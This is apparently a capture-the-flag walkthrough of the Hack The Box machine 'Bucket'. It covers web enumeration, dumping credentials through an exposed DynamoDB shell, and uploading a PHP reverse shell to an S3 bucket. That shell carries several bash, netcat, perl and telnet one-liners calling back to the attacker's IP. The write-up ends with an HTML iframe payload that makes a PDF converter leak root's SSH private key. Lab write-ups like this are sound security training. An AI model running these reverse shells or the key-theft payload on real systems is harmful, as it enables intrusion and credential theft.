# Enumeration


Enumerate Web Page
---------------------------------------------------------------

After nmap scan, we add `http://bucket.htb` to  our `/etc/hosts` file and visit the website
By viewing page source code, we see that the website is fetching images from `http://s3.bucket.htb` => we add that domain to our `hosts` file too and visit it

Running directories enumeration with gobuster for those 2 domains:
```
gobuster dir -u http://bucket.htb -w <word_list>
gobuster dir -u http://s3.bucket.htb -w <word_list>

```
The scan result show us that `http://s3.bucket.htb` have some interesting directories:
```
/shell
/shellscripts
```

Now we go to visit `http://s3.bucket.htb/shell/` (Note: `/` in the end is a must, I have struggled with this for a while until someone showed me that the `/` is actually important :( )

We can see that is a dynamoDB web-shell, with the capabilities to interact with dynamoDB javascript client in the web shell, we can perform queries to the DB and fetch valuable information

```
let params = {
    "TableName" : "users"
}
dynamodb.scan(params, (err,data) => {
    if (err) console.log(err)
    else console.log(data)
})
```
The data we got back from dynamoDB include `username` and `password` that can be valueable for further uses. Right now we don't have anywhere to use it.

Enumerate S3 Bucket
------------------------------------------------------------

We execute this command to enumerate the s3 bucket
```
docker run --rm -it -v ~/.aws:/root/.aws amazon/aws-cli configure
docker run --rm -it -v ~/.aws:/root/.aws amazon/aws-cli --endpoint-url http://s3.bucket.htb s3 ls s3://adserver/images/
```
After a quick check, list of available commands that we can use in aws cli in `s3.bucket.htb` include cp/move/delete
=> That's mean we can get our reverse shell by uploading rev shell file to s3 server.

# Exploitation

Reverse shell payload:
```
<?php
echo 'running shell';
$ip='10.10.14.71';   #Change this
$port='8787';
$reverse_shells = array(
    '/bin/bash -i > /dev/tcp/'.$ip.'/'.$port.' 0<&1 2>&1',
    '0<&196;exec 196<>/dev/tcp/'.$ip.'/'.$port.'; /bin/sh <&196 >&196 2>&196',
    '/usr/bin/nc '.$ip.' '.$port.' -e /bin/bash',
    'nc.exe -nv '.$ip.' '.$port.' -e cmd.exe',
    "/usr/bin/perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"".$ip.":".$port."\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'",
    'rm -f /tmp/p; mknod /tmp/p p && telnet '.$ip.' '.$port.' 0/tmp/p',
    'perl -e \'use Socket;$i="'.$ip.'";$p='.$port.';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\''
);
foreach ($reverse_shells as $reverse_shell) {
   try {echo system($reverse_shell);} catch (Exception $e) {echo $e;}
   try {shell_exec($reverse_shell);} catch (Exception $e) {echo $e;}
   try {exec($reverse_shell);} catch (Exception $e) {echo $e;}
}
system('id');
?>
```

Uploading reverse shell:
```
docker run --rm -it -v ~/.aws:/root/.aws amazon/aws-cli --endpoint-url http://s3.bucket.htb/ s3 cp myrev.php s3://adserver/php-revshell.php
```

***Note***: After a few tries, I realize after 30 seconds ~ 1 minute, the machine clean itself. Which mean is that everything we do will be deleted/removed, so we have to be fast !!!

I tried to access `bucket.htb/myrev.php` but every browser that I have tried with (Chrome/Safari/Firefox), they all offer me to download the file instead of executing it. So I wrote a quick script to increase the chance of getting reverse shell

```
#/bin/bash

docker run --rm -it -v ~/.aws:/root/.aws amazon/aws-cli --endpoint-url http://s3.bucket.htb s3 cp /root/.aws/php-revshell.php s3://adserver/

echo ""
echo "[+] Executing reverse shell on s3 server"
while [ 0 ]; do
	curl http://bucket.htb/php-revshell.php &> /dev/null
done
```
It simply automate the process of copying file to s3 server and trying to `curl` the URL

In our machine, start Netcat listener
```
nc -lvnp 4444 //Change port
```

After getting a reverse shell to our machine, we will want to spawn a TTY shell for a more interactive shell
```
/usr/bin/script -qc /bin/bash /dev/null
```

Get users in the system
```
cat /etc/passwd
```
We see that there is a user in the machine: `roy`
With the `username` and `password` we have collected from querying DynamoDB, it's worth to try some of the password with user `roy`
`roy` SSH creds:

```
roy:n2v*******:.Aa2
```
=> Get the user.txt flag in the machine

# Post Exploitation
So now we have user flag, I did a lot of enumeration with linpeas script, I found that there is a server listening on some port
```
netstat -auntp

tcp 	127.0.0.1:8000
```

I try to request to server and it returns a php page
```
curl -v localhost:8000

```
The PHP page return is similar to the `index.php` in `/var/www/bucket-app` => So we can guess that must be source code of the server is listening on port 8000

```
head -30 /var/www/bucket-app/index.php

<?php
require 'vendor/autoload.php';
use Aws\DynamoDb\DynamoDbClient;
if($_SERVER["REQUEST_METHOD"]==="POST") {
        if($_POST["action"]==="get_alerts") {
                date_default_timezone_set('America/New_York');
                $client = new DynamoDbClient([
                        'profile' => 'default',
                        'region'  => 'us-east-1',
                        'version' => 'latest',
                        'endpoint' => 'http://localhost:4566'
                ]);

                $iterator = $client->getIterator('Scan', array(
                        'TableName' => 'alerts',
                        'FilterExpression' => "title = :title",
                        'ExpressionAttributeValues' => array(":title"=>array("S"=>"Ransomware")),
                ));

                foreach ($iterator as $item) {
                        $name=rand(1,10000).'.html';
                        file_put_contents('files/'.$name,$item["data"]);
                }
                passthru("java -Xmx512m -Djava.awt.headless=true -cp pd4ml_demo.jar Pd4Cmd file:///var/www/bucket-app/files/$name 800 A4 -out files/result.pdf");
        }
}
else
{
?>

```
If we read the code, we will see that it loads DynamoDB javascript client and execute some logic as follow:
- If request method is POST and `{"action": "get_alerts"}`, it will execute the if statement
- Init dynamoDB client, scan Table name `alerts`
- Query filter for `title: Ransomware`
- In array of `alerts` that have `title: Ransomware`, iw will basically convert `data` field  to `pdf`

`Pd4Cmd` take html as an input, output is a PDF file.

Now from the first query that we did to fetch users credentials from DynamoDB, we notice that there is only one table `users`, there is no table name `alerts`.
So ... if we create an `alerts` table, and send POST request to the server, the server going to execute those code under `root` priviledge !!.

We navigate back to the dynamoDB web shell in `s3.bucket.htb/shell/` and insert the following code:
```

createTable = () => {
    let params = {
        "TableName": "alerts",
        "KeySchema": [
            { AttributeName: "title", KeyType: "HASH" },
            { AttributeName: "data", KeyType: "RANGE" }
        ],

        "AttributeDefinitions": [
            { AttributeName: "title", AttributeType: "S" },
            { AttributeName: "data", AttributeType: "S" },
        ],

        "ProvisionedThroughput": {
            "ReadCapacityUnits": 5,
            "WriteCapacityUnits": 5
        }
    }

    dynamodb.createTable(params, (err, data) => {
        if (err) console.log(err)
        else console.log(data)
    })
}

createItem = () => {
    let params = {
        "TableName": "alerts",
        "Item": {
            "title": {
                S: "Ransomware"
            },
            "data": {
                S: "<html><head></head><body><iframe src='/root/.ssh/id_rsa'></iframe></body></html>"
            }
        },
        "ReturnConsumedCapacity": "TOTAL"
    }
    dynamodb.putItem(params, (err, data) => {
        if (err) console.log(err)
        else console.log(data)
    })
}


createTable()
createItem()
dynamodb.scan({ "TableName": "alerts" }, (err, data) => {
    if (err) console.log(err)
    else console.log(data)
})
```

Payload of `data` field is for stealing the root SSH private key.
Execute it and then inside the machine, we `curl localhost:8000 -d "{\"action\": \"get_alerts\"}"`
And then after that, we copy `result.pdf` file to our local machine to read root private key
`scp roy@target://var/www/bucket-app ~`

=> Now we can login as root user with root private key, we can capture the `root.txt` flag.
